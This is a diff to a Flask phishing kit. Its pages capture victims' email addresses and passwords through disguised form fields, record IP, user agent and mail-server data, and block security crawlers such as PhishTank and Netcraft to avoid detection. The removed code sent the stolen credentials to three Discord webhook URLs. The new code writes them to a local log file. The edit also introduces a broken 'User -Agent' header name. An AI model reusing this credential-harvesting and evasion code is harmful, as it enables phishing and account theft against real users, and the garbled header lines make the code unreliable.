@@ -9,45 +9,19 @@ import time
 from PIL import Image, ImageDraw, ImageFont
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
-import smtplib, ssl
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-import time
-import random
 import dns.resolver
 
-DISCORD_WEBHOOK_URLS = [
-    "https://discord.com/api/webhooks/1339995643497681058/XBIWTD-VWQ0Ssg5KUR3ojdSuCkJFhRIw2TgYAvIXZce5BrVWVRQp0n9cySRZAdb1wQIe",
-    "https://discord.com/api/webhooks/1339995646026977360/BdA3_XSqqazCUfmRN6alny5QvbfPTZXkJxJWWRMM5TsZoXOdfcKQ8GUAoLrfPS32GR90",
-    "https://discord.com/api/webhooks/1339995668625756232/jUZhB0L27EePcFo4psPduhjh_4VIv0xzO3D2gYwNtplfcoAXfGXtUdbOMhDuWJxmYcKn"
-]
-
-def send_discord_message(email, password, ip, useragent, domain, mx_record):
-    webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
-    message = {
-        "username": "Logger Bot",
-        "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
-        "embeds": [
-            {
-                "title": "🔔 General New Login Attempt",
-                "color": 16711680,  # Red color in Discord embed
-                "fields": [
-                    {"name": "📧 Email", "value": f"`{email}`", "inline": False},
-                    {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
-                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
-                    {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
-                    {"name": "🌍 Domain", "value": f"`{domain}`", "inline": False},
-                    {"name": "📨 MX Record", "value": f"`{mx_record}`", "inline": False},
-                ],
-                "footer": {"text": "Logger Bot - Secure Notifications"},
-            }
-        ]
-    }
-    
-    try:
-        requests.post(webhook_url, json=message)
-    except requests.exceptions.RequestException as e:
-        print(f"Error sending message to Discord: {e}")
+# Function to log data to a text file
+def log_to_file(email, password, ip, useragent, domain, mx_record):
+    with open("login_attempts.txt", "a") as f:
+        f.write(f"🔔 General New Login Attempt\n")
+        f.write(f"📧 Email: {email}\n")
+        f.write(f"🔑 Password: {password}\n")
+        f.write(f"🌐 IP: {ip}\n")
+        f.write(f"🖥 User-Agent: {useragent}\n")
+        f.write(f"🌍 Domain: {domain}\n")
+        f.write(f"📨 MX Record: {mx_record}\n")
+        f.write("========================================\n")
 
 def get_mx_record(domain):
     try:
@@ -62,66 +36,66 @@ secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
 
 bot_user_agents = [
-'Googlebot', 
-'Baiduspider', 
-'ia_archiver',
-'R6_FeedFetcher', 
-'NetcraftSurveyAgent', 
-'Sogou web spider',
-'bingbot', 
-'Yahoo! Slurp', 
-'facebookexternalhit', 
-'PrintfulBot',
-'msnbot', 
-'Twitterbot', 
-'UnwindFetchor', 
-'urlresolver', 
-'Butterfly', 
-'TweetmemeBot',
-'PaperLiBot',
-'MJ12bot',
-'AhrefsBot',
-'Exabot',
-'Ezooms',
-'YandexBot',
-'SearchmetricsBot',
-'phishtank',
-'PhishTank',
-'picsearch',
-'TweetedTimes Bot',
-'QuerySeekerSpider',
-'ShowyouBot',
-'woriobot',
-'merlinkbot',
-'BazQuxBot',
-'Kraken',
-'SISTRIX Crawler',
-'R6_CommentReader',
-'magpie-crawler',
-'GrapeshotCrawler',
-'PercolateCrawler',
-'MaxPointCrawler',
-'R6_FeedFetcher',
-'NetSeer crawler',
-'grokkit-crawler',
-'SMXCrawler',
-'PulseCrawler',
-'Y!J-BRW',
-'80legs.com/webcrawler',
-'Mediapartners-Google', 
-'Spinn3r', 
-'InAGist', 
-'Python-urllib', 
-'NING', 
-'TencentTraveler',
-'Feedfetcher-Google', 
-'mon.itor.us', 
-'spbot', 
-'Feedly',
-'bot',
-'curl',
-"spider",
-"crawler"
+    'Googlebot', 
+    'Baiduspider', 
+    'ia_archiver',
+    'R6_FeedFetcher', 
+    'NetcraftSurveyAgent', 
+    'Sogou web spider',
+    'bingbot', 
+    'Yahoo! Slurp', 
+    'facebookexternalhit', 
+    'PrintfulBot',
+    'msnbot', 
+    'Twitterbot', 
+    'UnwindFetchor', 
+    'urlresolver', 
+    'Butterfly', 
+    'TweetmemeBot',
+    'PaperLiBot',
+    'MJ12bot',
+    'AhrefsBot',
+    'Exabot',
+    'Ezooms',
+    'YandexBot',
+    'SearchmetricsBot',
+    'phishtank',
+    'PhishTank',
+    'picsearch',
+    'TweetedTimes Bot',
+    'QuerySeekerSpider',
+    'ShowyouBot',
+    'woriobot',
+    'merlinkbot',
+    'BazQuxBot',
+    'Kraken',
+    'SISTRIX Crawler',
+    'R6_CommentReader',
+    'magpie-crawler',
+    'GrapeshotCrawler',
+    'PercolateCrawler',
+    'MaxPointCrawler',
+    'R6_FeedFetcher',
+    'NetSeer crawler',
+    'grokkit-crawler',
+    'SMXCrawler',
+    'PulseCrawler',
+    'Y!J-BRW',
+    '80legs.com/webcrawler',
+    'Mediapartners-Google', 
+    'Spinn3r', 
+    'InAGist', 
+    'Python-urllib', 
+    'NING', 
+    'TencentTraveler',
+    'Feedfetcher-Google', 
+    'mon.itor.us', 
+    'spbot', 
+    'Feedly',
+    'bot',
+    'curl',
+    "spider",
+    "crawler"
 ]
 
 # Function to generate a random CAPTCHA code
@@ -211,7 +185,6 @@ def success():
     else:
         return redirect(url_for('captcha'))
 
-
 @app.route("/")
 def route2():
     web_param = request.args.get('web')
@@ -219,7 +192,6 @@ def route2():
         session['eman'] = web_param
         session['ins'] = web_param[web_param.index('@') + 1:]
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
-
 
 @app.route("/first", methods=['POST'])
 def first():
@@ -231,14 +203,14 @@ def first():
 
         email = request.form.get("horse")
         password = request.form.get("pig")
-        useragent = request.headers.get('User-Agent')
+        useragent = request.headers.get('User -Agent')
 
         # Get MX record
         domain = email.split('@')[-1] if email and '@' in email else None
         mx_record = get_mx_record(domain) if domain else "Invalid Domain"
 
-        # Send data to Discord
-        send_discord_message(email, password, ip, useragent, domain, mx_record)
+        # Log data to a text file
+        log_to_file(email, password, ip, useragent, domain, mx_record)
 
         # Store email in session
         session['eman'] = email
@@ -247,8 +219,6 @@ def first():
         return redirect(url_for('benza', web=email))
 
     return "Method Not Allowed", 405
-
-
 
 @app.route("/second", methods=['POST'])
 def second():
@@ -260,14 +230,14 @@ def second():
 
         email = request.form.get("horse")
         password = request.form.get("pig")
-        useragent = request.headers.get('User-Agent')
+        useragent = request.headers.get('User -Agent')
 
         # Get MX record
         domain = email.split('@')[-1] if email and '@' in email else None
         mx_record = get_mx_record(domain) if domain else "Invalid Domain"
 
-        # Send data to Discord
-        send_discord_message(email, password, ip, useragent, domain, mx_record)
+        # Log data to a text file
+        log_to_file(email, password, ip, useragent, domain, mx_record)
 
         # Store email in session
         session['ins'] = email
@@ -276,8 +246,6 @@ def second():
         return redirect(url_for('lasmo', web=email))
 
     return "Method Not Allowed", 405
-
-
 
 @app.route("/benzap", methods=['GET'])
 def benza():
@@ -289,7 +257,7 @@ def benza():
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
     userip = request.headers.get("X-Forwarded-For")
-    useragent = request.headers.get("User-Agent")
+    useragent = request.headers.get("User -Agent")
     
     if useragent in bot_user_agents:
         abort(403)  # forbidden
@@ -299,4 +267,4 @@ def lasmo():
     return render_template('main.html', dman=dman)
 
 if __name__ == '__main__':
-	app.run(host="0.0.0.0", port=3000)
+    app.run(host="0.0.0.0", port=3000)
